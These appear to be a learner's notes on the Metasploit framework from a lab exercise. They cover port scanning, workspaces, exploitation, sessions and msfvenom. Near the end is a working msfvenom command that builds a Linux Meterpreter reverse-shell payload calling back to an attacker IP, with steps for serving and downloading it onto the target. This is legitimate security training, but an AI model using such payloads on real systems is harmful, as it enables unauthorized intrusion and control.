
# Tasks

- [ ] How to scan target systems using Metasploit.
- [ ] How to use the Metasploit database feature.
- [ ] How to use Metasploit to conduct a vulnerability scan.
- [ ] How to use Metasploit exploit vulnerable services on target systems.
- [ ] How `msfvenom` can be used to create payloads and obtain a Meterpreter session on the target system.

## Scanning

### Port Scanning

Metasploit has many modules to scan open ports on the target system and network.

- List potential port scanning modules available using `search portscan` command.

Options:

- **CONCURRENCY**
: Number of targets to be scanned simultaneously.

- **PORTS**
: Port range to be scanned. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.

- **RHOSTS**
: Target or target network to be scanned.

- **THREADS**
: Number of threads that will be used simultaneously. More threads = faster scans.

#### UDP Service Identification

`scanner/discovery/udp_sweep` module will allow to quickly identify services running over the UDP (User Data Protocol).

#### SMB Scans

On a corporate network, `smb_enumshares` and `smb_version` to identify specific services on system.

Metasploit has many modules that can help you have a better understanding of the target system and possibly help you find vulnerabilities. It is always worth performing a quick search to see if there are any modules that could be helpful based on your target system. 

[+] 10.10.192.91:         - 10.10.192.91:22 - TCP OPEN
[+] 10.10.192.91:         - 10.10.192.91:21 - TCP OPEN
[+] 10.10.192.91:         - 10.10.192.91:139 - TCP OPEN
[+] 10.10.192.91:         - 10.10.192.91:445 - TCP OPEN
[+] 10.10.192.91:         - 10.10.192.91:8000 - TCP OPEN
[*] 10.10.192.91:         - Scanned 1 of 1 hosts (100% complete)

## The Metasploit Database

Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.

### Starting Postgresql and `msfconsole` Database

You will first need to start the PostgreSQL database, which Metasploit will use with the following command: 

`systemctl start postgresql`

Then initialize Metasploit Database using the `msfdb init` command and `db_status` to check the status after launching msfconsole.

### Listing Workspaces

The database feature allows to create workspaces to isolate different projects. List available workspaces using the `workspace` command.

- Can add a workspace using the `-a` parameter or delete a workspace with `-d` parameter.

### Changing Workspaces

- Switch between workspaces by typing `workspace` followed by the desired workspace name.

#### Workspace Help

- Use `workspace -h` command to list available options for the `workspace` command.

#### Database Backend Commands

- Once Metasploit is launched with a database, the `help` command will show the Database Backends Commands menu.

#### db_nmap Command

- Running Nmap scan with `db_nmap` will save the results to the database.

#### Hosts and Services

- Can reach information relevant to hosts and services running on target systems with the `hosts` and `services` commands.

Once the host information is stored in the database, you can use the `hosts -R` command to add this value to the RHOSTS parameter.

### Vulnerability Scanning

Metasploit allows to quickly identify some critical vulnerabilities that could be considered as "low hanging fruit". Usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow access.

`info` command for any module to have a better understanding of its use and purpose.

### Exploitation

Metasploit is an exploitation framework and exploits are the most populated module category.

- Search for exploits using the `search` command.
- Obtain more information about the exploit using the `info` command.
- Launch the exploit using `exploit`.

The process seems simple but a successful outcome depends on a thorough understanding of services running on a target system.

#### Available Payloads

Most of the exploits have a preset default payload.

- Can always use the `show payloads` command to list other commands for that specific exploit.
- Use `set payload` command to select payload of choice.

#### Background

Once a session is opened, `CTRL+Z` to background or abort it using `CTRL+C`.

#### Working with Sessions

The `sessions` command will list all active sessions.

- Interact with any existing session using the `sessions -i` command followed by the session ID.

## Msfvenom

Replaces Msfpayload and Msfencode to generate payloads.

- Msfvenom will allow to access all payloads in the Metasploit framework.
- Msfvenom allows to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).

### Output Formats

- Can generate stand-alone payloads or get a usable raw format with `msfvenom --list formats`.

### Encoders

Encoders do not aim to bypass antivirus installed on the target system. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shell code is better solution to the problem.

- Usage of encoding with `-e` parameter.

### Handlers

Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload.

- The term commonly used to receive a connection from a target is "catching a shell". Reverse shells or Meterpreter callbacks generated in the MSFvenom payload can be easily caught using a handler.
- Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.
- Multi Handler to receive the incoming connections with `use exploit/multi/handler` command.

#### Other Payloads

Linux Executable and Linkable Format (elf)
`msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.13.40.171 LPORT=4444 -f elf > rev_shell.elf`

Transfer to the target machine by starting a Python web serer on attacking machine with `python3 -m http.server 9000` command. Then use wget to download it to the target machine (Linux)

## Summary

- Database feature can help with penetration testing with multiple targets.
- Creation of stand-alone Meterpreter payloads.
  - Helpful in situations where we can upload a file to the target system or have the ability to download files to the target system.
- Meterpreter is a powerful tool that offers a lot of features during the post-exploitation phase.